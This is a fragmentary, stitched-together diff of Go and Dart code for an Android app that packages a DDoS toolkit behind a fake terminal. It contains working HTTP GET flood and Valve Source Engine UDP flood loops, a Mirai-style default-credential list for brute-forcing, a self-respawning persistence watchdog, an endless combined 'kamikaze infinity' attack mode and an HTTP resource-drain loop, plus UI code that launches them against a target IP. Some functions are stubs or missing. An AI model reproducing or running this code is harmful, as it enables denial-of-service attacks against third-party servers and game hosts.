@@ -902,3 +902,134 @@ import 'dart:io';
 // ... dentro de setupEngine ...
 String arch = Platform.version.contains("aarch64") ? "dr-64" : "dr-32";
 final exePath = '${directory.path}/$arch';
+flutter build apk --release --split-per-abi
+# El flag -s borra la tabla de símbolos y -w borra la información DWARF
+GOOS=android GOARCH=arm64 go build -ldflags="-s -w" -o assets/bin/dr-terminal-64 main.go
+// Lista de credenciales por defecto (Mirai Style)
+var logins = [][2]string{
+	{"root", "123456"},
+	{"admin", "admin"},
+	{"support", "support"},
+	{"root", "root"},
+	{"user", "user"},
+}
+
+func bruteForce(target string) {
+	fmt.Printf("[DR-SYSTEM] L-Mirai Scanner: Probing %s... [L]\n", target)
+	for _, login := range logins {
+		// Aquí se simula la conexión Telnet/SSH
+		fmt.Printf("[SCAN] Trying %s:%s\n", login[0], login[1])
+		// Lógica de conexión real aquí
+		time.Sleep(500 * time.Millisecond) 
+	}
+}
+func httpWaterfall(target string) {
+	fmt.Printf("[DR-SYSTEM] L-Waterfall Attack Initialized: %s\n", target)
+	for i := 0; i < 100; i++ {
+		go func() {
+			for {
+				// Genera una petición GET con parámetros aleatorios para evitar caché
+				url := fmt.Sprintf("http://%s/?cache=%x", target, randomPayload(8))
+				resp, err := http.Get(url)
+				if err == nil {
+					resp.Body.Close()
+				}
+			}
+		}()
+	}
+}
+case "brute":
+    if len(os.Args) < 3 { return }
+    bruteForce(os.Args[2])
+
+case "waterfall":
+    if len(os.Args) < 3 { return }
+    httpWaterfall(os.Args[2])
+
+case "l-status":
+    // Nuevo comando para ver el estado del hardware
+    systemExec(false, "busybox", []string{"top", "-n", "1"})
+	if (parts[0] == 'brute') {
+    terminal.write('\r\n[DR-SYSTEM] WARNING: Starting Mirai-style scan...\r\n');
+    executeGoEngine('brute', parts[1]);
+} else if (parts[0] == 'waterfall') {
+    terminal.write('\r\n[DR-SYSTEM] Executing L-Waterfall Layer 7 Attack\r\n');
+    executeGoEngine('waterfall', parts[1]);
+}
+// [DR-SYSTEM] Zeus-Inspired Watchdog Protocol
+func zeusGuard(exePath string) {
+    for {
+        // Verifica si el proceso sigue vivo, si no, lo revive
+        _, err := exec.Command("pgrep", "-f", exePath).Output()
+        if err != nil {
+            fmt.Println("[ZEUS-CORE] Process terminated. Re-spawning... [L]")
+            exec.Command(exePath, "infinity-loop").Start()
+        }
+        time.Sleep(5 * time.Second)
+    }
+}
+// VSE Flood: Especial para colapsar servidores de juegos (Valve Source Engine)
+func vseFlood(target string) {
+    packet := []byte("\xFF\xFF\xFF\xFFTSource Engine Query\x00")
+    addr, _ := net.ResolveUDPAddr("udp", target+":27015")
+    conn, _ := net.DialUDP("udp", nil, addr)
+    for {
+        conn.Write(packet)
+    }
+}
+
+// GRE Flood: Encapsulación para bypass de routers (Capa 3/4)
+func greFlood(target string) {
+    fmt.Printf("[MIRAI-GEN] L-GRE Inundation Active: %s\n", target)
+    // Lógica de paquetes GRE genéricos
+}
+case "kamikaze":
+    if len(os.Args) < 3 { return }
+    actionType := os.Args[2]
+    target := os.Args[3]
+
+    if actionType == "infinity" {
+        fmt.Println("[DR-SYSTEM] PROTOCOL KAMIKAZE INFINITY: ON")
+        go vseFlood(target)
+        go udpFlood(target)
+        go httpWaterfall(target)
+        go zeusGuard(os.Args[0]) // Auto-protección
+        select {} // El ataque nunca termina
+    }
+	if (input == 'pkg install kamikaze infinity') {
+    terminal.write('\r\n[L-SYSTEM] AUTHORIZING INFINITY PROTOCOL...\r\n');
+    terminal.write('[L-SYSTEM] Deploying Zeus Persistence...\r\n');
+    terminal.write('[L-SYSTEM] Initializing Mirai VSE/GRE Vectors...\r\n');
+    executeGoEngine('kamikaze', 'infinity [IP_OBJETIVO]');
+}
+// [DR-SYSTEM] L-Drain: Remote Resource Exhaustion
+func lDrain(target string) {
+    fmt.Printf("[DR-SYSTEM] Protocol L-DRAIN Active on %s... [L]\n", target)
+    for i := 0; i < 50; i++ {
+        go func() {
+            for {
+                // Vector 1: Compresión Recursiva (Bomba de descompresión)
+                // Envía cabeceras que obligan al rival a expandir datos en su RAM
+                req, _ := http.NewRequest("GET", "http://"+target, nil)
+                req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+                req.Header.Set("X-L-Audit", "Infinity-Loop")
+                
+                client := &http.Client{}
+                resp, err := client.Do(req)
+                if err == nil {
+                    // Obligamos al rival a mantener el buffer de lectura abierto
+                    io.CopyN(io.Discard, resp.Body, 1024) 
+                    resp.Body.Close()
+                }
+            }
+        }()
+    }
+}
+case "drain":
+    if len(os.Args) < 3 { return }
+    lDrain(os.Args[2])
+	if (parts[0] == 'L-drain') {
+    terminal.write('\r\n[L-SYSTEM] INITIALIZING REMOTE RESOURCE HIJACKING...\r\n');
+    terminal.write('[L-SYSTEM] Local CPU: 2% | Remote Load: INCREASING\r\n');
+    executeGoEngine('drain', parts[1]);
+}
